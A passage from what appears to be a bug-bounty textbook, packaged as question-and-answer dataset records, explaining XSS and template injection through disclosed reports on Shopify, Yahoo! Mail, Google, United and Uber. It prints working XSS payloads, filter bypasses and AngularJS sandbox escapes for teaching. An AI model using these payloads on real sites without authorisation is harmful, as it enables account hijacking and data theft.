the cursor\nfocus on the input text box as soon as the page loads. The onfocus\nJavaScript attribute tells the browser to execute JavaScript when the\ninput text box is the focus (without autofocus, the onfocus would occur\nwhen a person clicks the text box). But these two attributes have\nlimits: you can’t autofocus on a hidden field. Also, if multiple fields\nare on a page with autofocus, either the first or last element will be the\n124\nDownload from www.finelybook.com 7450911@qq.com\nfocus depending on the browser. When the payload runs, it would\nalert on document.cookie.\nSimilarly, let’s say you had access to a variable within a <script>\ntag. If you could inject single quotes into the value for the name\nvariable in the following code, you could close the variable and\nexecute your own JavaScript:\n<script>\nvar name = 'hacker';\n</script>\nBecause we control the value hacker, changing the name variable to\nhacker';alert(document.cookie);' would result in the following:\n<script>\nvar name = 'hacker';alert(document.cookie);'';\n</script>\nInjecting a single quote and semicolon closes the variable name.\nBecause we’re using a <script> tag, the JavaScript function\nalert(document.cookie), which we also injected, will execute. We add an\nadditional ;' to end our function call and ensure the JavaScript is\nsyntactically correct because the site includes a '; to close the name\nvariable. Without the '; syntax at the end, there would be a dangling\nsingle quote, which could break the page syntax.\nAs you now know, you can execute XSS using several methods.\nThe website http://html5sec.org/, which the penetration testing experts\nat Cure53 maintain, is a great reference for XSS payloads.\nTYPES OF XSS\nThere are two main types of XSS: reflected and stored. Reflected XSS\n125\nDownload from www.finelybook.com 7450911@qq.com\noccurs when a single HTTP request that isn’t stored anywhere on the\nsite delivers and executes the XSS payload. Browsers, including\nChrome, Internet Explorer, and Safari, try to prevent this type of\nvulnerability by introducing XSS Auditors (in July 2018, Microsoft\nannounced they are retiring the XSS Auditor in the Edge browser due\nto other security mechanisms available to prevent XSS). XSS Auditors\nattempt to protect users from malicious links that execute JavaScript.\nWhen an XSS attempt occurs, the browser shows a broken page with a\nmessage stating the page has been blocked to protect users. Figure 7-1\nshows an example in Google Chrome.\nFigure 7-1: A page blocked by the XSS Auditor in Google Chrome\nDespite browser developers’ best efforts, attackers frequently\nbypass XSS Auditors because JavaScript can execute in complex\nways on a site. Because these methods of bypassing XSS Auditors\noften change, they’re beyond the scope of this book. But two great\n126\nDownload from www.finelybook.com 7450911@qq.com\nresources to learn more are FileDescriptor’s blog post at\nhttps://blog.innerht.ml/the-misunderstood-x-xss-protection/ and\nMasato Kinugawa’s filter bypass cheat sheet at\nhttps://github.com/masatokinugawa/filterbypass/wiki/Browser’s-XSS-\nFilter-Bypass-Cheat-Sheet/.\nIn contrast, stored XSS occurs when a site saves a malicious\npayload and renders it unsanitized. Sites might also render the\ninputted payload in various locations. The payload might not execute\nimmediately after submission, but it could execute when another page\nis accessed. For example, if you create a profile on a website with an\nXSS payload as your name, the XSS might not execute when you\nview your profile; instead, it might execute when someone searches\nfor your name or sends you a message.\nYou can also sort XSS attacks into the following three\nsubcategories: DOM-based, blind, and self. DOM-based XSS attacks\ninvolve manipulating a website’s existing JavaScript code to execute\nmalicious JavaScript; it can be either stored or reflected. For example,\nlet’s say the web page www.<example>.com/hi/ used the following\nHTML to replace its page contents with a value from a URL without\nchecking for malicious input. It might be possible to execute XSS.\n<html>\n<body>\n<h1>Hi <span id=\"name\"></span></h1>\n<script>document.getElementById('name').innerHTML=location.hash.split('#')\n[1]</script>\n</body>\n</html>\nIn this example web page, the script tag calls the document\nobject’s getElementById method to find the HTML element with the ID\n127\nDownload from www.finelybook.com 7450911@qq.com\n'name'. The call returns a reference to the span element in the <h1> tag.\nNext, the script tag modifies the text between the <span id=\"name\">\n</span> tags using the innerHTML method. The script sets the text\nbetween <span></span> to the value from the location.hash, which is any\ntext that occurs after a # in the URL (location is another browser API,\nsimilar to the DOM; it provides access to information about the\ncurrent URL).\nThus, visiting www.<example>.com/hi#Peter/ would result in the\npage’s HTML dynamically being updated to <h1><span\nid=\"name\">Peter</span></h1>. But this page doesn’t sanitize the # value\nin the URL before updating the <span> element. So if a user visited\nwww.<example>.com/h1#<img src=x\nonerror=alert(document.domain)>, a JavaScript alert box would pop\nup and display www.<example>.com (assuming no image x was\nreturned to the browser). The resulting HTML from the page would\nlook like this:\n<html>\n<body>\n<h1>Hi <span id=\"name\"><img src=x onerror=alert(document.domain)></span>\n</h1>\n<script>document.getElementById('name').innerHTML=location.hash.split('#')\n[1]</script>\n</body>\n</html>\nThis time, instead of rendering Peter between <h1> tags, the\nwebpage would display a JavaScript alert box with the document.domain\nname. An attacker could use this because, to execute any JavaScript,\nthey provide the JavaScript attribute of the <img> tag to the onerror.\nBlind XSS is a stored XSS attack in which another user renders the\n128\nDownload from www.finelybook.com 7450911@qq.com\nXSS payload from a location of the website a hacker can’t access. For\nexample, this might happen if you could add XSS as your first and last\nname when you create a personal profile on a site. Those values can\nbe escaped when regular users view your profile. But when an\nadministrator visits an administrative page listing all new users on the\nsite, the values might not be sanitized and the XSS might execute. The\ntool XSSHunter (https://xsshunter.com/) by Matthew Bryant is ideal\nfor detecting blind XSS. The payloads Bryant designed execute\nJavaScript, which loads a remote script. When the script executes, it\nreads the DOM, browser information, cookies, and other information\nthe payload sends back to your XSSHunter account.\nSelf XSS vulnerabilities are those that can impact only the user\nentering the payload. Because an attacker can attack only themselves,\nself XSS is considered low severity and doesn’t qualify for a reward in\nmost bug bounty programs. For example, it can occur when the XSS is\nsubmitted via a POST request. But because the request is protected by\nCSRF, only the target can submit the XSS payload. Self XSS may or\nmay not be stored.\nIf you find a self XSS, look for opportunities to combine it with\nanother vulnerability that can affect other users, such as login/logout\nCSRF. In this type of attack, a target is logged out of their account and\nlogged into the attacker’s account to execute the malicious JavaScript.\nTypically, a login/logout CSRF attack requires the ability to log the\ntarget back into an account using malicious JavaScript. We won’t look\nat a bug that uses login/logout CSRF, but a great example is one that\nJack Whitton found on an Uber site, which you can read about at\nhttps://whitton.io/articles/uber-turning-self-xss-into-good-xss/.\nXSS’s impact depends on a variety of factors: whether it’s stored\nor reflected, whether cookies are accessible, where the payload\n129\nDownload from www.finelybook.com 7450911@qq.com\nexecutes, and so on. Despite the potential damage XSS can cause on a\nsite, fixing XSS vulnerabilities is often easy, requiring only that\nsoftware developers sanitize user input (just as with HTML injection)\nbefore rendering it.\nSHOPIFY WHOLESALE\nDifficulty: Low\nURL: wholesale.shopify.com/\nSource: https://hackerone.com/reports/106293/\nDate reported: December 21, 2015\nBounty paid: $500\nXSS payloads don’t have to be complicated, but you do need to tailor\nthem to the location where they’ll be rendered and whether they’ll be\ncontained in HTML or JavaScript tags. In December 2015, Shopify’s\nwholesale website was a simple web page with a distinct search box at\nthe top. The XSS vulnerability on this page was simple but easily\nmissed: text input into the search box was being reflected unsanitized\nwithin existing JavaScript tags.\nPeople overlooked this bug because the XSS payload wasn’t\nexploiting unsanitized HTML. When XSS exploits how HTML is\nrendered, attackers can see the effect of the payload because HTML\ndefines the look and feel of a site. In contrast, JavaScript code can\nchange the look and feel of a site or perform another action, but it\ndoesn’t define the site’s look and feel.\nIn this case, entering \"><script>alert('XSS')</script> wouldn’t execute\nthe XSS payload alert('XSS') because Shopify was encoding the HTML\ntags <>. These characters would have been rendered harmlessly as &lt;\n130\nDownload from www.finelybook.com 7450911@qq.com\nand &gt;. A hacker realized the input was being rendered unsanitized\nwithin <script></script> tags on the web page. Most likely, the hacker\nreached this conclusion by viewing the page’s source, which contains\nthe HTML and JavaScript for the page. You can view the source for\nany web page by entering view-source:URL in a browser address bar.\nAs an example, Figure 7-2 shows part of the https://nostarch.com/\nsite’s page source.\nAfter realizing the input was rendered unsanitized, the hacker\nentered test';alert('XSS');' into Shopify’s search box, creating a\nJavaScript alert box with the text 'XSS' in it when rendered. Although\nit’s unclear in the report, it’s likely that Shopify was rendering the\nsearched term in a JavaScript statement, like var search_term =\n'<INJECTION>'. The first part of the injection, test';, would have closed\nthat tag and inserted the alert('XSS'); as a separate statement. The final '\nwould have ensured the JavaScript syntax was correct. The result\nwould presumably have looked like var search_term = 'test';alert('xss'); '';.\nFigure 7-2: The page source for https://nostarch.com/\nTakeaways\n131\nDownload from www.finelybook.com 7450911@qq.com\nXSS vulnerabilities don’t have to be intricate. The Shopify\nvulnerability wasn’t complex: it was just a simple input text field that\ndidn’t sanitize user input. When you’re testing for XSS, be sure to\nview the page source and confirm whether your payloads are being\nrendered in HTML or JavaScript tags.\nSHOPIFY CURRENCY FORMATTING\nDifficulty: Low\nURL: <YOURSITE>.myshopify.com/admin/settings/general/\nSource: https://hackerone.com/reports/104359/\nReport date: December 9, 2015\nBounty paid: $1,000\nXSS payloads don’t always execute immediately. Because of this,\nhackers should make sure the payload is properly sanitized in all the\nplaces it might be rendered. In this example, Shopify’s store settings\nallowed users to change currency formatting. In December 2015, the\nvalues from those input boxes weren’t properly sanitized when setting\nup social media pages. A malicious user could set up a store and inject\nan XSS payload in a store’s currency settings field, as shown in Figure\n7-3. The payload was rendered in the store’s social media sales\nchannel. The malicious user could configure the store to execute the\npayload when another store administrator visited the sales channel.\nShopify uses the Liquid template engine to dynamically render\ncontent on shop pages. For example, ${{ }} is the syntax for Liquid;\nthe variable to be rendered is entered inside the inner set of braces. In\nFigure 7-3, ${{amount}} is a legitimate value but is appended with the\nvalue \"><img src=x onerror=alert(document.domain)>, which is the XSS\n132\nDownload from www.finelybook.com 7450911@qq.com\npayload. The \"> closes the HTML tag that the payload is being\ninjected into. When the HTML tag is closed, the browser renders the\nimage tag and looks for an image x indicated in the src attribute.\nBecause an image with this value is unlikely to exist on Shopify’s\nwebsite, the browser encounters an error and calls the JavaScript event\nhandler onerror. The event handler executes the JavaScript defined in\nthe handler. In this case, it’s the function alert(document.domain).\n133\nDownload from www.finelybook.com 7450911@qq.com\nFigure 7-3: Shopify’s currency settings page at the time of the report\nWhile the JavaScript wouldn’t execute when a user visited the\ncurrency page, the payload also appeared in the Shopify store’s social\nmedia sales channel. When other store administrators clicked the\nvulnerable sales channel tab, the malicious XSS would be rendered\nunsanitized and execute the JavaScript.\nTakeaways\nXSS payloads don’t always execute immediately after they’re\nsubmitted. Because a payload could be used in multiple locations on a\nsite, be sure to visit each location. In this case, simply submitting the\nmalicious payload on the currency page didn’t execute the XSS. The\nbug reporter had to configure another website feature to cause the\nXSS to execute.\nYAHOO! MAIL STORED XSS\nDifficulty: Medium\nURL: Yahoo! Mail\nSource: https://klikki.fi/adv/yahoo.html\nDate reported: December 26, 2015\nBounty paid: $10,000\nSanitizing user input by modifying the inputted text can sometimes\nlead to problems if done incorrectly. In this example, Yahoo! Mail’s\neditor allowed people to embed images in an email via HTML using\nan <img> tag. The editor sanitized the data by removing any JavaScript\nattributes, such as onload, onerror, and so on, to avoid XSS\nvulnerabilities. However, it failed to avoid vulnerabilities that\n134\nDownload from www.finelybook.com 7450911@qq.com\noccurred when a user intentionally submitted malformed <img> tags.\nMost HTML tags accept attributes, which are additional\ninformation about the HTML tag. For example, the <img> tag requires\na src attribute pointing to the address of the image to render. The tag\nalso allows for width and height attributes to define the image’s size.\nSome HTML attributes are Boolean attributes: when they’re\nincluded in the HTML tag, they’re considered true, and when they’re\nomitted, they’re considered false.\nWith this vulnerability, Jouko Pynnonen found that if he added\nBoolean attributes to HTML tags with a value, Yahoo! Mail would\nremove the value but leave the attribute’s equal sign. Here is one of\nPynnonen’s examples:\n<INPUT TYPE=\"checkbox\" CHECKED=\"hello\" NAME=\"check box\">\nHere, the HTML input tag might include a CHECKED attribute\ndenoting whether a check box should be rendered as checked off.\nBased on Yahoo’s tag parsing, the line would become this:\n<INPUT TYPE=\"checkbox\" CHECKED= NAME=\"check box\">\nThis may look harmless, but HTML allows zero or more space\ncharacters around the equal sign in an unquoted attribute value. So\nbrowsers read this as CHECKED having the value of NAME=\"check and\nthe input tag having a third attribute named box, which doesn’t have a\nvalue.\nTo exploit this, Pynnonen submitted the following <img> tag:\n<img ismap='xxx' itemtype='yyy style=width:100%;height:100%;position:fixed;\nleft:0px;top:0px; onmouseover=alert(/XSS/)//'>\n135\nDownload from www.finelybook.com 7450911@qq.com\nYahoo! Mail filtering would change this to the following:\n<img ismap= itemtype='yyy' style=width:100%;height:100%;position:fixed;left:\n0px;top:0px; onmouseover=alert(/XSS/)//>\nThe ismap value is a Boolean <img> tag attribute that indicates\nwhether an image has clickable areas. In this case, Yahoo! removed\n'xxx', and the single quote from the end of the string was moved to the\nend of the yyy.\nSometimes, the backend of a site will be a black box and you\nwon’t know how code is being processed, as in this case. We don’t\nknow why the 'xxx' was removed or why the single quote was moved\nto the end of yyy. Yahoo’s parsing engine or the way the browser\nhandled whatever Yahoo! returned could have made these changes.\nStill, you can use these oddities to find vulnerabilities.\nBecause of the way the code was processed, an <img> tag with a\nheight and width of 100 percent was rendered, making the image take\nup the entire browser window. When a user moved their mouse over\nthe web page, the XSS payload would execute because of the\nonmouseover=alert(/XSS/) part of the injection.\nTakeaways\nWhen sites sanitize user input by modifying it instead of encoding or\nescaping values, you should continue testing the site’s server-side\nlogic. Think about how a developer might have coded their solution\nand what assumptions they’ve made. For example, check whether the\ndeveloper considered what happens if two src attributes are submitted\nor if spaces are replaced with slashes. In this case, the bug reporter\nchecked what would happen when Boolean attributes were submitted\nwith values.\n136\nDownload from www.finelybook.com 7450911@qq.com\nGOOGLE IMAGE SEARCH\nDifficulty: Medium\nURL: images.google.com/\nSource: https://mahmoudsec.blogspot.com/2015/09/how-i-found-\nxss-vulnerability-in-google.html\nDate reported: September 12, 2015\nBounty paid: Undisclosed\nDepending on where your input is being rendered, you don’t always\nneed to use special characters to exploit XSS vulnerabilities. In\nSeptember 2015, Mahmoud Jamal was using Google Images to find\nan image for his HackerOne profile. While browsing, he noticed the\nimage URL http://www.google.com/imgres?\nimgurl=https://lh3.googleuser.com/... from Google.\nNoting the reference to imgurl in the URL, Jamal realized he could\ncontrol the parameter’s value; it would likely be rendered on the page\nas a link. When hovering over the thumbnail image for his profile,\nJamal confirmed that the <a> tag href attribute included the same URL.\nHe tried changing the imgurl parameter to javascript:alert(1) and noticed\nthat the href attribute also changed to the same value.\nThis javascript:alert(1) payload is useful when special characters are\nsanitized because the payload doesn’t contain special characters for\nthe website to encode. When clicking a link to javascript:alert(1), a new\nbrowser window opens and the alert function executes. In addition,\nbecause the JavaScript executes in the context of the initial web page,\nwhich contains the link, the JavaScript can access the DOM of that\npage. In other words, a link to javascript:alert(1) would execute the alert\nfunction against Google. This result shows that a malicious attacker\n137\nDownload from www.finelybook.com 7450911@qq.com\ncould potentially access information on the web page. If clicking a\nlink to the JavaScript protocol didn’t inherit the context of the initial\nsite rendering the link, the XSS would be harmless: attackers couldn’t\naccess the vulnerable web page’s DOM.\nExcited, Jamal clicked what he thought would be his malicious\nlink, but no JavaScript executed. Google had sanitized the URL\naddress when the mouse button was clicked via the anchor tag’s\nonmousedown JavaScript attribute.\nAs a workaround, Jamal tried tabbing through the page. When he\ngot to the View Image button, he pressed ENTER. The JavaScript was\ntriggered because he could visit the link without clicking the mouse\nbutton.\nTakeaways\nAlways be on the lookout for URL parameters that might be reflected\non the page because you have control over those values. If you find\nany URL parameters that are rendered on a page, consider their\ncontext as well. URL parameters might present opportunities to get\naround filters that remove special characters. In this example, Jamal\ndidn’t need to submit any special characters because the value was\nrendered as the href attribute in an anchor tag.\nAdditionally, look for vulnerabilities even on Google and other\nmajor sites. It’s easy to assume that just because a company is huge,\nall its vulnerabilities have been discovered. Clearly, that isn’t always\nthe case.\nGOOGLE TAG MANAGER STORED XSS\nDifficulty: Medium\n138\nDownload from www.finelybook.com 7450911@qq.com\nURL: tagmanager.google.com/\nSource: https://blog.it-securityguard.com/bugbounty-the-5000-\ngoogle-xss/\nDate reported: October 31, 2014\nBounty paid: $5,000\nA common best practice of websites is to sanitize user input when\nrendering it instead of when it’s being saved on submission. The\nreason is that it’s easy to introduce new ways to submit data to a site\n(like a file upload) and to forget to sanitize the input. In some cases,\nhowever, companies don’t follow this practice: Patrik Fehrenbach of\nHackerOne discovered this lapse in October 2014 when he was testing\nGoogle for XSS vulnerabilities.\nGoogle Tag Manager is an SEO tool that makes it easy for\nmarketers to add and update website tags. To do this, the tool has a\nnumber of web forms that users interact with. Fehrenbach began by\nfinding available form fields and entering XSS payloads, such as #\">\n<img src=/ onerror=alert(3)>. If the payload was accepted by the form\nfield, the payload would close the existing HTML tag and then try to\nload a nonexistent image. Because the image wouldn’t be found, the\nwebsite would execute the onerror JavaScript function alert(3).\nBut Fehrenbach’s payload didn’t work. Google was properly\nsanitizing his input. Fehrenbach noticed an alternative way to submit\nhis payload. In addition to the form fields, Google provides the ability\nto upload a JSON file with multiple tags. So Fehrenbach uploaded the\nfollowing JSON file to Google’s service:\n\"data\": {\n\"name\": \"#\"><img src=/ onerror=alert(3)>\",\n\"type\": \"AUTO_EVENT_VAR\",\n139\nDownload from www.finelybook.com 7450911@qq.com\n\"autoEventVarMacro\": {\n\"varType\": \"HISTORY_NEW_URL_FRAGMENT\"\n}\n}\nNotice that the value of the name attribute is the same XSS payload\nFehrenbach tried previously. Google wasn’t following best practices\nand was sanitizing input from the web form on submission instead of\nat the time of rendering. As a result, Google forgot to sanitize input\nfrom the file upload, so Fehrenbach’s payload executed.\nTakeaways\nTwo details are worth noting in Fehrenbach’s report. First,\nFehrenbach found an alternative input method for his XSS payload.\nYou should look for an alternative input method as well. Be sure to\ntest all methods a target provides to enter input, because the way each\ninput is processed might be different. Second, Google was attempting\nto sanitize on input instead of at the time of rendering. Google could\nhave prevented this vulnerability by following best practices. Even\nwhen you know website developers typically use common\ncountermeasures against certain attacks, check for vulnerabilities.\nDevelopers can make mistakes.\nUNITED AIRLINES XSS\nDifficulty: Hard\nURL: checkin.united.com/\nSource: http://strukt93.blogspot.jp/2016/07/united-to-xss-\nunited.html\nDate reported: July 2016\n140\nDownload from www.finelybook.com 7450911@qq.com\nBounty paid: Undisclosed\nIn July 2016, while searching for cheap flights, Mustafa Hasan began\nlooking for bugs on United Airlines sites. He found that visiting the\nsubdomain checkin.united.com redirected to a URL that included an\nSID parameter. Noticing that any value passed to the parameter was\nrendered in the page HTML, he tested \"><svg onload=confirm(1)>. If\nrendered improperly, the tag would close the existing HTML tag and\ninject Hasan’s <svg> tag, resulting in a JavaScript pop-up courtesy of\nthe onload event.\nBut when he submitted his HTTP request, nothing happened,\nalthough his payload was rendered as is, unsanitized. Rather than\ngiving up, Hasan opened the site’s JavaScript files, likely with the\nbrowser’s development tools. He found the following code, which\noverrides JavaScript attributes that might lead to XSS, such as the\nattributes alert, confirm, prompt, and write:\n[function () {\n/*\nXSS prevention via JavaScript\n*/\nvar XSSObject = new Object();\nXSSObject.lockdown = function(obj,name) {\nif (!String.prototype.startsWith) {\ntry {\nif (Object.defineProperty) {\nObject.defineProperty(obj, name, {\nconfigurable: false\n});\n}\n} catch (e) { };\n}\n}\nXSSObject.proxy = function (obj, name, report_function_name, ➊exec_original)\n141\nDownload from www.finelybook.com 7450911@qq.com\n{\nvar proxy = obj[name];\nobj[name] = function () {\nif (exec_original) {\nreturn proxy.apply(this, arguments);\n}\n};\nXSSObject.lockdown(obj, name);\n};\n➋ XSSObject.proxy(window, 'alert', 'window.alert', false);\nXSSObject.proxy(window, 'confirm', 'window.confirm', false);\nXSSObject.proxy(window, 'prompt', 'window.prompt', false);\nXSSObject.proxy(window, 'unescape', 'unescape', false);\nXSSObject.proxy(document, 'write', 'document.write', false);\nXSSObject.proxy(String, 'fromCharCode', 'String.fromCharCode', true);\n}]();\nEven if you don’t know JavaScript, you might guess what’s\nhappening via the use of certain words. For example, the exec_original\nparameter name ➊ in the XSSObject proxy definition implies a\nrelationship that executes something. Immediately below the\nparameter is a list of all our interesting functions and the value false\nbeing passed (except in the last instance) ➋. We can assume the site is\ntrying to protect itself by disallowing the execution of the JavaScript\nattributes passed into XSSObject proxy.\nNotably, JavaScript allows you to override existing functions. So\nHasan first tried to restore the document.write function by adding the\nfollowing value in the SID:\njavascript:document.write=HTMLDocument.prototype.write;document.write('STRUKT');\nThis value sets the document’s write function to its original\nfunctionality by using the write function’s prototype. Because\nJavaScript is object oriented, all objects have a prototype. By calling\n142\nDownload from www.finelybook.com 7450911@qq.com\non the HTMLDocument, Hasan set the current document’s write function\nback to the original implementation from HTMLDocument. He then\ncalled document.write('STRUKT') to add his name in plaintext to the page.\nBut when Hasan tried to exploit this vulnerability, he got stuck\nagain. He reached out to Rodolfo Assis for help. Working together,\nthey realized that United’s XSS filter was missing the override for a\nfunction similar to write: the writeln function. The difference between\nthese two functions is that writeln adds a newline after writing its text,\nwhereas write doesn’t.\nAssis believed he could use the writeln function to write content to\nthe HTML document. Doing so would allow him to bypass one piece\nof United’s XSS filter. He did this with the following payload:\n\";}{document.writeln(decodeURI(location.hash))-\"#<img src=1 onerror=alert(1)>\nBut his JavaScript still didn’t execute because the XSS filter was\nstill being loaded and overriding the alert function: Assis needed to use\na different method. Before we look at the final payload and how Assis\nworked around the alert override, let’s break down his initial payload.\nThe first piece, \";}, closes the existing JavaScript being injected\ninto. Next, { opens the JavaScript payload, and document.writeln calls\nthe JavaScript document object’s writeln function to write content to\nthe DOM. The decodeURI function passed to writeln decodes encoded\nentities in a URL (for example, %22 will become \"). The location.hash\ncode passed to decodeURI returns all parameters after the # in the URL,\nwhich is defined later. After this initial setup is done, -\" replaces the\nquote at the start of the payload to ensure proper JavaScript syntax.\nThe last piece, #<img src=1 onerror=alert(1)>, adds a parameter that is\nnever sent to the server. This last piece is a defined, optional part of a\n143\nDownload from www.finelybook.com 7450911@qq.com\nURL, called a fragment, and it’s meant to refer to a part of the\ndocument. But in this case, Assis used a fragment to take advantage of\nthe hash (#) that defines the start of the fragment. The reference to\nlocation.hash returns all content after the #. But the returned content will\nbe URL encoded, so the input <img src=1 onerror=alert(1)> will be\nreturned as %3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E%20. To\naddress the encoding, the function decodeURI decodes the content back\nto the HTML <img src=1 onerror=alert(1)>. This is important because the\ndecoded value is passed to the writeln function, which writes the\nHTML <img> tag to the DOM. The HTML tag executes the XSS when\nthe site can’t find the image 1 referenced in the src attribute of the tag.\nIf the payload is successful, a JavaScript alert box would pop up with\nthe number 1 in it. But it didn’t.\nAssis and Hasan realized they needed a fresh HTML document\nwithin the context of the United site: they needed a page that didn’t\nhave the XSS filter JavaScript loaded but still had access to the United\nweb page information, cookies, and so on. So they used an iFrame\nwith the following payload:\n\";}{document.writeln(decodeURI(location.hash))-\"#<iframe\nsrc=javascript:alert(document.domain)><iframe>\nThis payload behaved just like the original URL with the <img>\ntag. But in this one they wrote an <iframe> to the DOM and changed\nthe src attribute to use the JavaScript scheme to alert(document.domain).\nThis payload is similar to the XSS vulnerability discussed in “Google\nImage Search” on page 65, because the JavaScript scheme inherits the\ncontext of the parent DOM. Now the XSS could access the United\nDOM, so document.domain printed www.united.com. The vulnerability\nwas confirmed when the site rendered a pop-up alert.\n144\nDownload from www.finelybook.com 7450911@qq.com\nAn iFrame can take a source attribute to pull in remote HTML. As\na result, Assis could set the source to be JavaScript, which\nimmediately called the alert function with the document domain.\nTakeaways\nNote three important details about this vulnerability. First, Hasan was\npersistent. Rather than giving up when his payload wouldn’t fire, he\ndug into the JavaScript to find out why. Second, the use of a\nJavaScript attribute blacklist should tip off hackers that XSS bugs\nmight exist in the code because they’re opportunities for developer\nmistakes. Third, having JavaScript knowledge is essential for\nsuccessfully confirming more complex vulnerabilities.\nSUMMARY\nXSS vulnerabilities represent real risk for site developers and are still\nprevalent on sites, often in plain sight. By submitting a malicious\npayload, like <img src=x onerror=alert(document.domain)>, you can check\nwhether an input field is vulnerable. But this isn’t the only way to test\nfor XSS vulnerabilities. Any time a site sanitizes input through\nmodification (by removing characters, attributes, and so on), you\nshould thoroughly test the sanitization functionality. Look for\nopportunities where sites are sanitizing input on submission rather\nthan when rendering the input, and test all methods of input. Also,\nlook for URL parameters you control being reflected on the page;\nthese might allow you to find an XSS exploit that can bypass\nencoding, such as adding javascript:alert(document.domain) to the href\nvalue in an anchor tag.\nIt’s important to consider all places that a site is rendering your\n145\nDownload from www.finelybook.com 7450911@qq.com\ninput and whether it’s in HTML or JavaScript. Keep in mind that XSS\npayloads might not execute immediately.\n146"
  },
  {
    "input": "What are the key differences between server-side and client-side template injection vulnerabilities, and how can each be exploited to achieve remote code execution or XSS?",
    "summary": "Template injection involves using placeholders in templates to dynamically generate content, but it can lead to vulnerabilities if user input isn't properly sanitized. There are two main types: server-side and client-side. Server-side injections can allow remote code execution, while client-side ones are more likely to be used for XSS. The Uber AngularJS and Flask Jinja2 examples show how template injection can be exploited to execute code or access sensitive data. Understanding the technologies used by a website is crucial for identifying potential template injection vulnerabilities and testing them effectively.",
    "output": "Download from www.finelybook.com 7450911@qq.com\n8\nTEMPLATE INJECTION\nA template engine is code that creates dynamic websites, emails, and\nother media by automatically filling in placeholders in the template\nwhen rendering it. By using placeholders, the template engine allows\ndevelopers to separate application and business logic. For example, a\nwebsite might use just one template for user profile pages with\ndynamic placeholders for profile fields, such as the user’s name, email\naddress, and age. Template engines also usually provide additional\nbenefits, such as user input sanitization features, simplified HTML\ngeneration, and easy maintenance. But these features don’t make\ntemplate engines immune to vulnerabilities.\nTemplate injection vulnerabilities occur when engines render user\ninput without properly sanitizing it, sometimes leading to remote code\nexecution. We’ll cover remote code execution in more detail in\nChapter 12.\nThere are two types of template injection vulnerabilities: server\nside and client side.\n147\nDownload from www.finelybook.com 7450911@qq.com\nSERVER-SIDE TEMPLATE INJECTIONS\nServer-side template injection (SSTI) vulnerabilities occur when the\ninjection happens in the server-side logic. Because template engines\nare associated with specific programming languages, when an\ninjection occurs, you may sometimes be able to execute arbitrary code\nfrom that language. Whether or not you can do this depends on the\nsecurity protections the engine provides, as well as the site’s\npreventative measures. The Python Jinja2 engine has allowed arbitrary\nfile access and remote code execution, as has the Ruby ERB template\nengine that Rails uses by default. In contrast, Shopify’s Liquid Engine\nallows access to a limited number of Ruby methods in an attempt to\nprevent full remote code execution. Other popular engines include\nPHP’s Smarty and Twig, Ruby’s Haml, Mustache, and so on.\nTo test for SSTI vulnerabilities, you submit template expressions\nusing the specific syntax for the engine in use. For example, PHP’s\nSmarty template engine uses four braces {{ }} to denote expressions,\nwhereas ERB uses a combination of angle brackets, percent symbols,\nand an equal sign <%= %>. Typical testing for injections on Smarty\ninvolves submitting {{7*7}} and looking for areas where inputs are\nreflected back on the page (such as in forms, URL parameters, and so\non). In this case, you’d look for 49 rendered from the code 7*7\nexecuting in the expression. If you find 49, you’ll know that you\nsuccessfully injected your expression and the template evaluated it.\nBecause the syntax isn’t uniform across all template engines, you\nmust know the software used to build the site you’re testing. Tools\nlike Wappalyzer and BuiltWith are specifically designed for this\npurpose. After identifying the software, use that template engine’s\nsyntax to submit a simple payload, such as 7*7.\n148\nDownload from www.finelybook.com 7450911@qq.com\nCLIENT-SIDE TEMPLATE INJECTIONS\nClient-side template injection (CSTI) vulnerabilities occur in client\ntemplate engines and are written in JavaScript. Popular client template\nengines include Google’s AngularJS and Facebook’s ReactJS.\nBecause CSTIs occur in the user’s browser, you typically can’t use\nthem to achieve remote code execution, but you can use them for\nXSS. However, achieving XSS can sometimes be difficult and\nrequires bypassing preventative measures, just as with SSTI\nvulnerabilities. For example, ReactJS does a great job of preventing\nXSS by default. When testing applications using ReactJS, you should\nsearch the JavaScript files for the function dangerouslySetInnerHTML,\nwhere you can control input provided to the function. This\nintentionally bypasses ReactJS’s XSS protections. With regard to\nAngularJS, versions earlier than 1.6 include a Sandbox that limits\naccess to some JavaScript functions and protects against XSS (to\nconfirm the AngularJS version, enter Angular.version in the developer\nconsole in your browser). But ethical hackers routinely found and\nreleased AngularJS Sandbox bypasses before the version 1.6 release.\nThe following is a popular bypass for Sandbox versions 1.3.0 to 1.5.7\nthat you can submit when you find an AngularJS injection:\n{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}\nYou’ll find other published AngularJS Sandbox escapes at\nhttps://pastebin.com/xMXwsm0N and https://jsfiddle.net/89aj1n7m/.\nDemonstrating the severity of a CSTI vulnerability requires you to\ntest the code you can potentially execute. Although you might be able\nto evaluate some JavaScript code, some sites might have additional\nsecurity mechanisms to prevent exploitation. For example, I found a\n149\nDownload from www.finelybook.com 7450911@qq.com\nCSTI vulnerability by using the payload {{4+4}}, which returned 8 on\na site using AngularJS. But when I used {{4*4}}, the text {{44}} was\nreturned because the site sanitized the input by removing the asterisk.\nThe field also removed special characters, such as () and [], and it\nallowed a maximum of 30 characters. Combined, these preventative\nmeasures effectively rendered the CSTI useless.\nUBER ANGULARJS TEMPLATE\nINJECTION\nDifficulty: High\nURL: https://developer.uber.com/\nSource: https://hackerone.com/reports/125027/\nDate reported: March 22, 2016\nBounty paid: $3,000\nIn March 2016, James Kettle, the lead security researcher at\nPortSwigger (creator of Burp Suite) found a CSTI vulnerability in an\nUber subdomain via the URL https://developer.uber.com/docs/deep-\nlinking?q=wrtz{{7*7}}. If you viewed the rendered page source after\nvisiting the link, you’d find the string wrtz49, showing that the\ntemplate had evaluated the expression 7*7.\nAs it turned out, developer.uber.com used AngularJS to render its\nweb pages. You could confirm this by using a tool such as\nWappalyzer or BuiltWith or by viewing the page source and looking\nfor ng- HTML attributes. As mentioned, older versions of AngularJS\nimplemented a Sandbox, but the version Uber was using was\nvulnerable to a Sandbox escape. So in this case, a CSTI vulnerability\nmeant you could execute XSS.\n150\nDownload from www.finelybook.com 7450911@qq.com\nUsing the following JavaScript within the Uber URL, Kettle\nescaped the AngularJS Sandbox and executed the alert function:\nhttps://developer.uber.com/docs/deep-linking?q=wrtz{{(_=\"\".sub).call.call({}\n[$=\"constructor\"].getOwnPropertyDescriptor(_.__proto__,$).value,0,\"alert(1)\")\n()}}zzzz\nDeconstructing this payload is beyond the scope of this book,\ngiven the publication of numerous AngularJS Sandbox bypasses and\nthe removal of the Sandbox in version 1.6. But the end result of the\npayload 